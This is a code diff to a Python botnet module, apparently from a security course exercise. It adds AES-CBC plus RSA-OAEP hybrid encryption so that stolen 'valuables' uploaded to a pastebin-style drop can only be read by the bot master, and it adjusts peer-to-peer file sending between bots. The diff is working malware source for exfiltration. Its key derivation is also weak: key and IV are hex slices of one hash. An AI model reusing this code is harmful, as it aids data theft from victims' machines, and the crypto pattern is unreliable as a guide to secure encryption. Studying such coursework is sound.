@@ -4,6 +4,12 @@ from Crypto.Signature import PKCS1_v1_5
 from Crypto.Cipher import PKCS1_OAEP
 from Crypto.Hash import SHA256
 
+from Crypto.Cipher import AES
+from Crypto.Random import random
+from Crypto.Hash import SHA256
+from . import crypto_utils
+import struct
+
 # Instead of storing files on disk,
 # we'll save them in memory for simplicity
 filestore = {}
@@ -20,9 +26,22 @@ def encrypt_for_master(data):
     # Encrypt the file so it can only be read by the master bot
     # I.e Use the master bots' public key to encrypt the data
 
-    # QUESTIONS:
-    # Do we need to pad the data to avoid 'textbook' RSA?
-    # How do we cope with data of 'arbitrary size'?
+    # Generate AES material and then AES key and iv
+    AES_material = random.getrandbits(256)
+    AES_material_h = SHA256.new(bytes(str(AES_material), "ascii")).hexdigest()
+    AES_key = AES_material_h[0:32]
+    AES_iv = AES_material_h[-16:]
+
+    # Create AES container
+    AES_container = b"".join([bytes(str(AES_key),"ascii"), bytes(str(AES_iv),"ascii")])
+
+    # Use AES to encrypt file
+    cipher = AES.new(AES_key, AES.MODE_CBC, AES_iv)
+
+    # Pad the data with the correct blocksize for AES
+    padded_data = crypto_utils.ANSI_X923_pad(data, 16)
+    # Encrypt the padded data
+    encrypted_data = cipher.encrypt(padded_data)
     
     # Read masters' public key PEM file
     file = open(os.path.join("pastebot.net/publickeys", "master_pubkey.pem"), "r")
@@ -31,9 +50,11 @@ def encrypt_for_master(data):
     file.close()
     # Create new OAEP cipher with masters' public key and SHA256 Hashing algorithm
     cipher = PKCS1_OAEP.new(pubkey, hashAlgo=SHA256)
-    # Encrypt data with OAEP cipher
-    ciphertext = cipher.encrypt(data)
-    return ciphertext
+
+    # Encrypt AES key and iv with OAEP cipher
+    AES_container_e = cipher.encrypt(AES_container)
+
+    return AES_container_e + encrypted_data
 
 def upload_valuables_to_pastebot(fn):
     # Encrypt the valuables so only the bot master can read them
@@ -103,7 +124,8 @@ def p2p_upload_file(sconn, fn):
         print("That file doesn't exist in the botnet's filestore")
         return
     print("Sending %s via P2P" % fn)
-    sconn.send(fn)
+
+    sconn.send(bytes(fn,"ascii"))
     sconn.send(filestore[fn])
 
 def run_file(f):
